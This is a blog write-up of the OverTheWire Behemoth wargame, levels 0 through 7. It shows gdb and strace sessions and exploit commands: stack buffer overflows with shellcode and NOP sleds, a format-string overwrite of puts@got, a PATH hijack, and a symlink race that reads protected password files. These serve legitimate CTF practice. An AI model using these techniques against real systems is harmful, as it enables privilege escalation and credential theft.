---
layout: post
title: "OverTheWire: Behemoth Writeup"
date: 2015-01-21 08:22:57 -0500
comments: true
categories: wargames
---

While killing time waiting for the next CTF, a handful of us from [Team VulnHub](https://ctf-team.vulnhub.com) decided to have a go at OverTheWire's Behemoth challenges. I hadn't played Behemoth before and found it pretty fun. The game is described as:

> This wargame deals with a lot of regular vulnerabilities found commonly 'out in the wild'. While the game makes no attempts at emulating a real environment it will teach you how to exploit several of the most common coding mistakes including buffer overflows, race conditions and privilege escalation.  

If you're interested, you can find more information at [http://overthewire.org/wargames/behemoth/](http://overthewire.org/wargames/behemoth/)

<!--more-->

This writeup is a reference for myself on how I solved each challenge, and is not meant to be used as a guide to completing them. The passwords for each level have been purposely ommitted, and some solutions are intentionally "broken" to discourage copy/pasting to solve a level. If you want to play, I encourage you to try to solve the challenges on your own and work your way up to the finish. 

## Level 0

This first challenge is an easy warm-up. behemoth0 asks for a password and if we provide the correct one, it spawns a shell. Examining it in gdb shows that it uses memfrob() to decrypt an encrypted password in memory, and then compares the decrypted password with our input. 

```text
   0x08048613 <+113>:   mov    DWORD PTR [esp+0x4],eax
   0x08048617 <+117>:   lea    eax,[esp+0x1f]
   0x0804861b <+121>:   mov    DWORD PTR [esp],eax
   0x0804861e <+124>:   call   0x804857d <memfrob>
```

memfrob() isn't all that secure, as we can see from its man page: 

> The memfrob() function encrypts the first n bytes of the memory area s by exclusive-ORing each character with the number 42. The effect can be reversed by using memfrob() on the encrypted memory area.

We set a breakpoint at memfrob() and run the binary. When it pauses, we see that a string is being passed to memfrob(), which is "OK\^GSYBEX\^Y". This string is located in 0xbffff35f: 

```
[-------------------------------------code-------------------------------------]
   0x8048613 <main+113>:    mov    DWORD PTR [esp+0x4],eax
   0x8048617 <main+117>:    lea    eax,[esp+0x1f]
   0x804861b <main+121>:    mov    DWORD PTR [esp],eax
=> 0x804861e <main+124>:    call   0x804857d <memfrob>
   0x8048623 <main+129>:    lea    eax,[esp+0x1f]
   0x8048627 <main+133>:    mov    DWORD PTR [esp+0x4],eax
   0x804862b <main+137>:    lea    eax,[esp+0x2b]
   0x804862f <main+141>:    mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0xbffff35f ("OK^GSYBEX^Y")
arg[1]: 0xb ('\x0b')
```

If we let memfrob() execute and examine this memory location again, we'll see the decrypted password: 

```
gdb-peda$ ni
.
.
.
gdb-peda$ x/s 0xbffff35f
0xbffff35f:  "e■■■■■■■■■s"
```

Let's solve the challenge: 

```
behemoth0@melinda:~$ whoami
behemoth0
behemoth0@melinda:~$ /behemoth/behemoth0  
Password: e■■■■■■■■■s
Access granted..
$ whoami
behemoth1
```

## Level 1

behemoth1 appears to behave similarly to behemoth0 except if we look at it in gdb, we see that there are no branches, and no correct password. Instead we need to exploit the gets() function to overflow a buffer and spawn our own shell. Entering a 100 byte cyclic pattern causes it to crash: 

```
gdb-peda$ r
Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xb7fbdff4 --> 0x160d7c 
ECX: 0xb7fbe4e0 --> 0xfbad2a84 
EDX: 0xb7fbf360 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41356341 ('Ac5A')
ESP: 0xbffff3c0 ("7Ac8Ac9Ad0Ad1Ad2A")
EIP: 0x63413663 ('c6Ac')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x63413663
[------------------------------------stack-------------------------------------]
0000| 0xbffff3c0 ("7Ac8Ac9Ad0Ad1Ad2A")
0004| 0xbffff3c4 ("Ac9Ad0Ad1Ad2A")
0008| 0xbffff3c8 ("d0Ad1Ad2A")
0012| 0xbffff3cc ("1Ad2A")
0016| 0xbffff3d0 --> 0xb7ff0041 (sti)
0020| 0xbffff3d4 --> 0xffffffff 
0024| 0xbffff3d8 --> 0xb7ffeff4 --> 0x1cf2c 
0028| 0xbffff3dc --> 0x8048247 ("__libc_start_main")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x63413663 in ?? ()
```

Running pattern_offset.rb on the value in EIP shows that it's at offset 79. Since ASLR and NX are disabled, we can execute our shellcode on the stack and hardcode an address to it. We'll store our shellcode in an environment variable and get its address using [getenvaddr](https://github.com/Partyschaum/haxe/blob/master/getenvaddr.c): 

```
behemoth1@melinda:/tmp/koji$ export W00T=`python -c 'print "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x72\x79\x20\x68\x61\x72\x64\x65\x72"'`
behemoth1@melinda:/tmp/koji$ ./getenvaddr W00T /behemoth/behemoth1 
W00T will be at 0xffffdef1
```

Since the binary asks for input, we'll overflow the buffer by redirecting input from a file. 

```
behemoth1@melinda:/tmp/koji$ python -c 'from struct import *; print "A"*79 + pack("<I", 0xffffdef1)' > in.txt
```

Piping the contents of in.txt into behemoth1 elevates us to the behemoth2 user: 

```
behemoth1@melinda:/tmp/koji$ whoami
behemoth1
behemoth1@melinda:/tmp/koji$ (cat in.txt ; cat) | /behemoth/behemoth1 
Password: Authentication failure.
Sorry.
whoami
behemoth2
```

## Level 2

Running behemoth2 gives us an error and apparently freezes up so we need to hit Ctrl-C to terminate it: 

```
behemoth2@melinda:~$ /behemoth/behemoth2 
touch: cannot touch '32208': Permission denied
^C
behemoth2@melinda:~$ /behemoth/behemoth2 
touch: cannot touch '11843': Permission denied
^C
```

What's this doing? Running strace on it shows that the seemingly random file its attempting to access is actually the PID of the behemoth2 process, and then it sleeps:

```
getpid()                                = 14678
lstat64("14678", 0xffffd5b0)            = -1 ENOENT (No such file or directory)
unlink("14678")                         = -1 ENOENT (No such file or directory)
rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xffffd4f0) = 14684
waitpid(14684, touch: cannot touch '14678': Permission denied
[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0) = 14684
rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=14684, si_status=1, si_utime=0, si_stime=0} ---
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
nanosleep({2000, 0}, 
```

It looks like touch is being called without an absolute path, so we can take advantage of that. First we'll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. 

Running behemoth2 now tricks it into running our touch script which gives us the password: 

```
behemoth2@melinda:/tmp/koji$ /behemoth/behemoth2 
n■■■■■■■■l
```

## Level 3

behemoth3 prompts us to enter our name and then prints a welcome message. There's no buffer overflow here, but if we step through it in gdb we see that the last call to printf() is vulnerable to a format string attack:

```
[-------------------------------------code-------------------------------------]
   0x80484b9 <main+60>: call   0x8048330 <printf@plt>
   0x80484be <main+65>: lea    eax,[esp+0x18]
   0x80484c2 <main+69>: mov    DWORD PTR [esp],eax
=> 0x80484c5 <main+72>: call   0x8048330 <printf@plt>
   0x80484ca <main+77>: mov    DWORD PTR [esp],0x804858e
   0x80484d1 <main+84>: call   0x8048350 <puts@plt>
   0x80484d6 <main+89>: mov    eax,0x0
   0x80484db <main+94>: leave
Guessed arguments:
arg[0]: 0xbffff2e8 ("AAAABBBB\n")
``` 

There is no format string passed to printf(), so let's see what happens when we pass our own:

```
behemoth3@melinda:~$ /behemoth/behemoth3 
Identify yourself: AAAABBBB.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Welcome, AAAABBBB.c8.f7fcac20.f7ff2eb6.2.f7ffd000.41414141.42424242.2e78252e.252e7825.78252e78.2e78252e
```

We're leaking data off the stack now, and our format string starts off at offset 6. From the disassembly in gdb, puts() is the next function called, so we'll overwrite puts@got and point it to our shellcode. Let's start by storing some shellcode in an environment variable:

```
behemoth3@melinda:/tmp/koji$ export W00T=`python -c 'print "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x72\x79\x20\x68\x61\x72\x64\x65\x72"'`
behemoth3@melinda:/tmp/koji$ ./getenvaddr W00T /behemoth/behemoth3 
W00T will be at 0xffffdef1
```

We can now overwrite puts@got with the address of our shellcode. In order to send our payload to the binary in gdb, we'll use a python script to write it into a file, and then redirect the contents of that file into the binary within gdb. Here's the python script: 

```python
#!/usr/bin/env python

from struct import *
f = open("in.txt", "w")

buf =  "\x90\x97\x04\x08"
buf += "\x92\x97\x04\x08"

# shellcode at 0xffffdef1
buf += "%1c%6$hn"
buf += "%1c%7$hn"
buf += "\n"

f.write(buf)
f.close()
```

This python script should write 10 to the high order bytes of puts@got and 9 to its low order bytes. Running the python script creates a file called in.txt. We'll redirect its contents into the binary: 

```
(gdb) r < in.txt 
Starting program: /games/behemoth/behemoth3 < in.txt
Identify yourself: Welcome, ����� 

Program received signal SIGSEGV, Segmentation fault.
0x000a0009 in ?? ()
```

gdb crashed with an address 0x000a0009 indicating we've overwritten puts@got. As expected, we've overwritten the high order bytes with 10, and the low order bytes with 9. With a bit of math, we adjust the padding so as to write the correct address into puts@got: 

```python
#!/usr/bin/env python

from struct import *
f = open("in.txt", "w")


buf =  "\x90\x97\x04\x08"
buf += "\x92\x97\x04\x08"

# shellcode at 0xffffdef1
buf += "%57065c%6$hn"
buf += "%8462c%7$hn"
buf += "\n"

f.write(buf)
f.close()
```

Running this in gdb crashes with the following:

```text
Program received signal SIGSEGV, Segmentation fault.
0xffffdef1 in ?? ()
```

The address matches the address of our shellcode. Let's try it outside of gdb and see if it works. 

```
behemoth3@melinda:/tmp/koji$ whoami
behemoth3
behemoth3@melinda:/tmp/koji$ (cat in.txt ; cat) | /behemoth/behemoth3 
Identify yourself: Welcome, ���� 
.
.
.
whoami
behemoth4
```

## Level 4

Running behemoth4 causes it to print out "PID not found"

```
behemoth4@melinda:~$ /behemoth/behemoth4 
PID not found!
```

What's it looking for? Using strace, we see that it's attempting to open a file in /tmp named after its PID. 

```
getpid()                                = 3437
brk(0)                                  = 0x804b000
brk(0x806c000)                          = 0x806c000
open("/tmp/3437", O_RDONLY)             = -1 ENOENT (No such file or directory)
```

Looking at gdb, we see that if it does find that file it's looking for, it opens it up and prints its contents to stdout. If we run strace on the binary several times, we'll see that the PID numbers eventually loop back to smaller numbers. So all we need to do is create a symbolic link to /etc/behemoth_pass/behemoth5 in /tmp. This symbolic link needs to have a numeric name that falls  within the range of a PID value. In this case, we'll pick a random number 1856. 

```
behemoth4@melinda:~$ ln -s /etc/behemoth_pass/behemoth5 /tmp/1856
```

Now we'll run behemoth4 continously until it gets a PID of 1856 and it will print out the password:

```
behemoth4@melinda:~$ while :; do x=`/behemoth/behemoth4`; echo $x | grep "PID not found"; if [[ $? -ne 0 ]]; then break; fi; done
```

After some time, we get a hit:

```
.
.
.
PID not found!
PID not found!
PID not found!
PID not found!
password: Finished sleeping, fgetcing
a■■■■■■■■g
```

## Level 5

behemoth5 doesn't print out any output, but running it within strace shows that it's actually reading the contents of /etc/behemoth_pass/behemoth6 into memory: 

```
brk(0x806c000)                          = 0x806c000
open("/etc/behemoth_pass/behemoth6", O_RDONLY) = -1 EACCES (Permission denied)
dup(2)                                  = 3
fcntl64(3, F_GETFL)                     = 0x8002 (flags O_RDWR|O_LARGEFILE)
```

Unfortunately we don't have read access to this file when using strace, so let's try debugging behemoth5 on our own system. We'll setup a similar environment:

```
root@kali ~/behemoth
# mkdir /etc/behemoth_pass

root@kali ~/behemoth
# echo w00tw00t > /etc/behemoth_pass/behemoth6
```

Running strace locally now successfully opens the file for reading. Further down the strace output we see the following:

```
socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 3
sendto(3, "w00tw00t\n", 9, 0, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16) = 9
```

Looks like the binary is sending the password to a service on 127.0.0.1 listening on UDP port 1337. With this information on hand, we can now solve the challenge. We'll setup a listener on port 1337/UDP and when we run behemoth5 from another SSH session, our listener will receive the password for the next level. 


## Level 6

There appear to be two files for this challenge; behemoth6 and behemoth6_reader. Running behemoth6 prints out "Incorrect output"

```
behemoth6@melinda:~$ /behemoth/behemoth6
Incorrect output.
```

Running behemoth6_reader prints out a different message:

```
behemoth6@melinda:~$ /behemoth/behemoth6_reader 
Couldn't open shellcode.txt!
```

Let's open behemoth6 in gdb and see what's going on. At *main+24 we see that behemoth6_reader is being executed using popen():

```
   0x08048586 <+9>: mov    DWORD PTR [esp+0x4],0x80486f0
   0x0804858e <+17>:    mov    DWORD PTR [esp],0x80486f2
   0x08048595 <+24>:    call   0x80483f0 <popen@plt>
   .
   .
   .
gdb-peda$ x/s 0x80486f0
0x80486f0:   "r"
gdb-peda$ x/s 0x80486f2
0x80486f2:   "/behemoth/behemoth6_reader"
```

Further down at *main+128, strcmp() is called after pclose(): 

```
   0x080485fd <+128>:   mov    DWORD PTR [esp+0x4],0x8048724
   0x08048605 <+136>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048609 <+140>:   mov    DWORD PTR [esp],eax
   0x0804860c <+143>:   call   0x80483e0 <strcmp@plt>
   .
   .
   .
gdb-peda$ x/s 0x8048724
0x8048724:   "HelloKitty"
```

strncmp() is comparing the output of behemoth6_reader with "HelloKitty" and if the output matches, it goes on to call execl() at *main+187 and spawns a shell. Now that we know what behemoth6 is doing, let's load behemoth6_reader into gdb.

We know that it's looking for shellcode.txt and that it needs to output "HelloKitty". However there's a little catch. If we look at *main+200, we see the following:

```
   0x08048675 <+200>:   cmp    al,0xb
   0x08048677 <+202>:   jne    0x8048691 <main+228>
   0x08048679 <+204>:   mov    DWORD PTR [esp],0x804877d
   0x08048680 <+211>:   call   0x8048450 <puts@plt>
   0x08048685 <+216>:   mov    DWORD PTR [esp],0x1
   0x0804868c <+223>:   call   0x8048470 <exit@plt>
   .
   .
   .
gdb-peda$ x/s 0x804877d
0x804877d:   "Write your own shellcode."
```

behemoth6_reader goes through each byte in the shellcode and if it finds 0xb, it prints out "Write your own shellcode." and exits. 0xb is 11, which is the Linux syscall for execve. That means we can't use execve to spawn a shell, but we don't need a shell, we just need to print out "HelloKitty". The following assembly code does just that:

```nasm
[SECTION .text]

global _start

_start:
    jmp short getmsg

printmsg:
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx
    mov al, 0x4
    mov bl, 0x1
    pop ecx
    mov dl, 0xa
    int 0x80

    xor eax, eax
    mov al, 0x1
    xor ebx,ebx
    int 0x80

getmsg:
    call printmsg
    db 'HelloKitty'
```

Now we just compile it, grab the opcodes using objdump, and write them into shellcode.txt. 

```text
root@kali ~/behemoth
# nasm -f elf kitty.asm -o kitty.o

root@kali ~/behemoth
# ld kitty.o -o kitty

root@kali ~/behemoth
# objdump -d kitty
```

If we run behemoth6, we should now get a shell: 

```
behemoth6@melinda:/tmp/koji$ whoami
behemoth6
behemoth6@melinda:/tmp/koji$ /behemoth/behemoth6
Correct.
$ whoami
behemoth7
```

On to the final level!

## Level 7

Unlike the previous binaries, behemoth7 takes its user input in the form of an argument. Passing it a really long string causes it to crash: 

```
behemoth7@melinda:~$ /behemoth/behemoth7 `python -c 'print "A"*600'`
Segmentation fault
```

Let's find EIP's offset. We'll use a 600 byte cyclic pattern and crash it in gdb and run the value of EIP in pattern_offset.rb: 

```
root@kali ~/behemoth
# pattern_offset.rb 0x39724138
[*] Exact match at offset 536
```

EIP is at offset 536. Let's go ahead and crash it in gdb again. This time we'll pass it  536 bytes of junk, a dummy value for the saved return pointer, and another 100 bytes of junk to see what the registers and the stack look like at the time of crash

```
gdb-peda$ r `python -c 'print "A"*536 + "BBBB" + "C"*100'`

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xb7fbdff4 --> 0x160d7c 
ECX: 0x0 
EDX: 0x281 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff140 ('C' <repeats 100 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff140 ('C' <repeats 100 times>)
0004| 0xbffff144 ('C' <repeats 96 times>)
0008| 0xbffff148 ('C' <repeats 92 times>)
0012| 0xbffff14c ('C' <repeats 88 times>)
0016| 0xbffff150 ('C' <repeats 84 times>)
0020| 0xbffff154 ('C' <repeats 80 times>)
0024| 0xbffff158 ('C' <repeats 76 times>)
0028| 0xbffff15c ('C' <repeats 72 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

We don't control any of the registers, but our payload is in the stack and since there's no ASLR or NX, we can jump to a hardcoded address on the stack and execute shellcode. Unlike before, we can't set our shellcode in an environment variable because the binary actually zeroes out the environment variables. 

Ok let's try to see if we can jump to our shellcode on the stack. We'll jump to address 0xbffff178 which will land us in a NOP sled:

```
gdb-peda$ r `python -c 'from struct import *; print "A"*536 + pack("<I", 0xbffff178)  + "\x90"*50 + "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x72\x79\x20\x68\x61\x72\x64\x65\x72"'`
process 22156 is executing new program: /bin/dash
#
```

Hey it worked! Let's try it on the server now. All we have to do is crash it while it's in gdb so we can get an address to jump to. 

```
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/12wx $esp
0xffffd460: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd470: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd480: 0x90909090  0x90909090  0x90909090  0x90909090
```

We'll use 0xffffd470, which falls right in our NOP sled. 

```
behemoth7@melinda:~$ whoami
behemoth7
behemoth7@melinda:~$ /behemoth/behemoth7 `python -c 'import struct; print "A"*536 + struct.pack("<I", 0xffffd470) + "\x90"*50 + "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x72\x79\x20\x68\x61\x72\x64\x65\x72"'`
$ whoami
behemoth8
```

And that's it for the final challenge. Behemoth was fun and relatively easy. Great for beginners to who want to practice some exploit writing and privilege escalation techniques. 

